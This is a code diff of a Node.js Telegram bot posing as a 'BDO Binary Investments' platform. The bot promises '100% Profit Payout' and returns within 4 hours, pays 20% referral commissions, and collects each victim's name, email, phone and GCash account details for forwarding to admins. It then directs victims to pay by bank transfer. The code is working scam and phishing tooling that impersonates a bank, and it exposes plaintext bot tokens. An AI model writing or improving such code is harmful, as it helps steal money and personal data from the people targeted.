@@ -1,7 +1,8 @@
 import TelegramBot from "node-telegram-bot-api";
 import pm2 from "pm2";
+
 // Initialize bot
-const bot = new TelegramBot("7876987617:AAGinjrq1w282tEujARUijOgY6Ocgy3o7R8", { polling: true });
+const bot = new TelegramBot("7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY", { polling: true });
 
 // Admin user IDs to notify
 const ADMIN_IDS = [6300694007, 7279302614];
@@ -13,7 +14,7 @@ const IMAGES = [
 ];
 
 // User data storage
-const userDatabase = new Map(); // Stores: { userId, name, username, referralCode, referredBy, balance, investments, registration data }
+const userDatabase = new Map();
 
 // Investment plans with unique links
 const investmentPlans = [
@@ -37,7 +38,6 @@ const REGISTRATION_STEPS = {
     FULL_NAME: "full_name",
     GENDER: "gender",
     EMAIL: "email",
-    INVESTMENT_AMOUNT: "investment_amount",
     PHONE: "phone",
     COUNTRY: "country",
     GCASH_NAME: "gcash_name",
@@ -56,6 +56,10 @@ function generateReferralCode(userId) {
 
 function validateEmail(email) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function validatePhone(phone) {
+    return /^[0-9]{10,15}$/.test(phone);
 }
 
 function chunkArray(arr, size) {
@@ -104,7 +108,7 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
         });
 
         // Notify admins about new registration
-        const notifyMessage = `🆕 *New Account Created*\n\n` +
+        const notifyMessage = `🆕 *New Account Started*\n\n` +
             `User: ${msg.from.first_name || 'No name'} ${username}\n` +
             `ID: ${userId}\n` +
             `Referral: ${referralCode || 'Direct'}`;
@@ -125,18 +129,21 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
     }
 
     const user = userDatabase.get(userId);
-    const welcomeMessage = `*Welcome To Our Legit BDO Investments Company God Bless You!*\n\n` +
-        `BDO Binary Investment Platform is a trading platform offered by BDO.\n\n` +
+    const welcomeMessage = `*Welcome To BDO Binary Investments!*\n\n` +
         `🔒 *100% Safe & Secure*\n💰 *100% Profit Payout*\n🚫 No Fees\n\n` +
-        `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
-        `💸 *Referral Balance:* ₱${user.balance.toFixed(2)}\n\n` +
-        `Invite friends and earn 20% of their investment earnings!`;
+        `${user.step === REGISTRATION_STEPS.COMPLETE ? 
+            `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
+            `💸 *Referral Balance:* ₱${user.balance.toFixed(2)}\n\n` +
+            `Invite friends and earn 20% of their investment earnings!` : 
+            `Please complete your registration to start investing!`}`;
 
     const options = {
         reply_markup: {
             inline_keyboard: [
                 [{ text: "📝 Register Now", callback_data: "start_registration" }],
-                [{ text: "💰 Investment Plans", callback_data: "view_plans" }],
+                user.step === REGISTRATION_STEPS.COMPLETE ? 
+                    [{ text: "💰 Invest Now", callback_data: "invest_now" }] : 
+                    [{ text: "💰 Invest Now", callback_data: "need_register" }],
                 [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
             ]
         }
@@ -146,8 +153,20 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
 });
 
 // Command: /invest
-bot.onText(/\/invest/, (msg) => {
-    showInvestmentPlans(msg.chat.id);
+bot.onText(/\/invest/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!userDatabase.has(userId)) {
+        return await sendMessageWithImage(chatId, "Please /start first to begin");
+    }
+
+    const user = userDatabase.get(userId);
+    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+    }
+
+    await showInvestmentPlans(chatId);
 });
 
 // Command: /refer
@@ -160,6 +179,10 @@ bot.onText(/\/refer/, async (msg) => {
     }
     
     const user = userDatabase.get(userId);
+    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+    }
+    
     const referralMessage = `🚀 *Refer Friends & Earn 20% Commission!*\n\n` +
         `Share your referral link below:\n\n` +
         `🔗 *Your Referral Link:*\n` +
@@ -184,14 +207,31 @@ bot.on("callback_query", async (query) => {
     if (data === "start_registration") {
         startRegistration(chatId, userId);
     } 
+    else if (data === "invest_now") {
+        if (!userDatabase.has(userId)) {
+            return await sendMessageWithImage(chatId, "Please /start first to begin");
+        }
+        const user = userDatabase.get(userId);
+        if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+            return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+        }
+        await showInvestmentPlans(chatId);
+    }
+    else if (data === "need_register") {
+        await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+    }
     else if (data === "view_plans") {
         await showInvestmentPlans(chatId);
     }
     else if (data === "refer_friends") {
-        bot.onText(/\/refer/, { chat_id: chatId, from: { id: userId } });
-    }
-    else if (data === "invest_now") {
-        await showInvestmentPlans(chatId);
+        if (!userDatabase.has(userId)) {
+            return await sendMessageWithImage(chatId, "Please /start first to get your referral code");
+        }
+        const user = userDatabase.get(userId);
+        if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+            return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+        }
+        await bot.onText(/\/refer/, { chat_id: chatId, from: { id: userId } });
     }
     else if (data.startsWith("plan_")) {
         const plan = investmentPlans.find(p => data === `plan_${p.amount}`);
@@ -207,7 +247,7 @@ bot.on("callback_query", async (query) => {
             
             await notifyAdmins(notifyMessage);
             
-            await processInvestment(userId, plan.amount.replace('₱', '').replace('K', '000'));
+            await processInvestment(chatId, userId, plan);
         }
     }
 });
@@ -229,13 +269,13 @@ bot.on("message", async (msg) => {
         case REGISTRATION_STEPS.FULL_NAME:
             user.registrationData.fullName = text;
             user.step = REGISTRATION_STEPS.GENDER;
-            await sendMessageWithImage(chatId, "📝 *BUONG PANGALAN (Full Name):* " + text + "\n\n*KASARIAN (Gender):*");
+            await sendMessageWithImage(chatId, "📝 *Gender:*");
             break;
             
         case REGISTRATION_STEPS.GENDER:
             user.registrationData.gender = text;
             user.step = REGISTRATION_STEPS.EMAIL;
-            await sendMessageWithImage(chatId, "📧 *EMAIL ADDRESS:*");
+            await sendMessageWithImage(chatId, "📧 *Email Address:*");
             break;
             
         case REGISTRATION_STEPS.EMAIL:
@@ -244,37 +284,45 @@ bot.on("message", async (msg) => {
                 return;
             }
             user.registrationData.email = text;
-            user.step = REGISTRATION_STEPS.INVESTMENT_AMOUNT;
-            await showInvestmentPlans(chatId, true);
-            break;
-            
-        case REGISTRATION_STEPS.INVESTMENT_AMOUNT:
-            user.registrationData.investmentAmount = text;
             user.step = REGISTRATION_STEPS.PHONE;
-            await sendMessageWithImage(chatId, "📱 *NUMERO NG TELEPONO (Phone Number):*");
+            await sendMessageWithImage(chatId, "📱 *Phone Number:*");
             break;
             
         case REGISTRATION_STEPS.PHONE:
+            if (!validatePhone(text)) {
+                await sendMessageWithImage(chatId, "⚠️ Invalid phone number. Please enter a valid number:");
+                return;
+            }
             user.registrationData.phone = text;
             user.step = REGISTRATION_STEPS.COUNTRY;
-            await sendMessageWithImage(chatId, "🌍 *BANSA (Country):*");
+            await sendMessageWithImage(chatId, "🌍 *Country:*");
             break;
             
         case REGISTRATION_STEPS.COUNTRY:
             user.registrationData.country = text;
             user.step = REGISTRATION_STEPS.GCASH_NAME;
-            await sendMessageWithImage(chatId, "💳 *GCASH NAME:*");
+            await sendMessageWithImage(chatId, "💳 *GCash Name:*");
             break;
             
         case REGISTRATION_STEPS.GCASH_NAME:
             user.registrationData.gcashName = text;
             user.step = REGISTRATION_STEPS.GCASH_ACCOUNT;
-            await sendMessageWithImage(chatId, "📱 *GCASH ACCOUNT NUMBER:*");
+            await sendMessageWithImage(chatId, "📱 *GCash Account Number:*");
             break;
             
         case REGISTRATION_STEPS.GCASH_ACCOUNT:
             user.registrationData.gcashAccount = text;
             user.step = REGISTRATION_STEPS.COMPLETE;
+            
+            // Notify admins about completed registration
+            const notifyMessage = `✅ *Registration Completed*\n\n` +
+                `User: ${user.name} ${username}\n` +
+                `ID: ${userId}\n` +
+                `Phone: ${user.registrationData.phone}\n` +
+                `Country: ${user.registrationData.country}`;
+            
+            await notifyAdmins(notifyMessage);
+            
             await completeRegistration(chatId, user);
             break;
     }
@@ -285,7 +333,7 @@ function startRegistration(chatId, userId) {
     const user = userDatabase.get(userId);
     user.step = REGISTRATION_STEPS.FULL_NAME;
     user.registrationData = {};
-    sendMessageWithImage(chatId, "📝 *BUONG PANGALAN (Full Name):*");
+    sendMessageWithImage(chatId, "📝 *Full Name:*");
 }
 
 async function showInvestmentPlans(chatId, isRegistration = false) {
@@ -297,14 +345,14 @@ async function showInvestmentPlans(chatId, isRegistration = false) {
 
     const buttons = investmentPlans.map(plan => ({
         text: `${plan.amount} → ${plan.earnings}`,
-        callback_data: `plan_${plan.amount}`
+        url: plan.link
     }));
 
     const options = {
         reply_markup: {
             inline_keyboard: [
                 ...chunkArray(buttons, 2),
-                isRegistration ? [{ text: "🚫 Cancel Registration", callback_data: "cancel_registration" }] : []
+                isRegistration ? [{ text: "🚫 Cancel", callback_data: "cancel_registration" }] : []
             ].filter(Boolean)
         }
     };
@@ -318,13 +366,12 @@ async function completeRegistration(chatId, user) {
         `👤 Name: ${user.registrationData.fullName}\n` +
         `⚤ Gender: ${user.registrationData.gender}\n` +
         `📧 Email: ${user.registrationData.email}\n` +
-        `💵 Investment: ${user.registrationData.investmentAmount}\n` +
         `📱 Phone: ${user.registrationData.phone}\n` +
         `🌍 Country: ${user.registrationData.country}\n` +
         `💳 GCash: ${user.registrationData.gcashName} (${user.registrationData.gcashAccount})\n\n` +
         `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
         `🔗 *Referral Link:* https://t.me/${bot.options.username}?start=${user.referralCode}\n\n` +
-        `Start investing now!`;
+        `You can now start investing!`;
 
     const options = {
         reply_markup: {
@@ -338,14 +385,13 @@ async function completeRegistration(chatId, user) {
     await sendMessageWithImage(chatId, confirmation, options);
 }
 
-// Process investment and handle referrals
-async function processInvestment(userId, amount) {
-    const numericAmount = parseInt(amount.replace(/[^\d]/g, ''));
+// Process investment with payment instructions
+async function processInvestment(chatId, userId, plan) {
     const user = userDatabase.get(userId);
     
     // Record investment
     user.investments.push({
-        amount: numericAmount,
+        amount: plan.amount.replace('₱', '').replace('K', '000'),
         date: new Date(),
         status: "pending"
     });
@@ -357,7 +403,7 @@ async function processInvestment(userId, amount) {
         );
         if (referrer) {
             const [referrerId, referrerData] = referrer;
-            const commission = numericAmount * 0.20; // 20% commission
+            const commission = parseInt(plan.amount.replace('₱', '').replace('K', '000')) * 0.20;
             referrerData.balance += commission;
             userDatabase.set(referrerId, referrerData);
             
@@ -369,12 +415,17 @@ async function processInvestment(userId, amount) {
         }
     }
 
-    // Notify user
-    await sendMessageWithImage(userId,
-        `✅ *Investment Received!*\n\n` +
-        `Your investment of ₱${numericAmount.toFixed(2)} is being processed.\n` +
-        `Expect profits in 4 hours!`);
+    // Send payment instructions
+    const paymentMessage = `💵 *You selected ${plan.amount} investment*\n\n` +
+        `1. Pay on the website you were redirected to\n` +
+        `2. Select "Check out"\n` +
+        `3. Fill your name and email address\n` +
+        `4. Click "Pay now"\n` +
+        `5. Select "Bank transfer" and send to the account details provided\n\n` +
+        `Your payment will be automatically confirmed and you'll receive your interest within 4 hours!`;
+
+    await sendMessageWithImage(chatId, paymentMessage);
 }
 
 // Start the bot
-console.log("BDO Investment Bot is running...")
+console.log("BDO Investment Bot is running...");
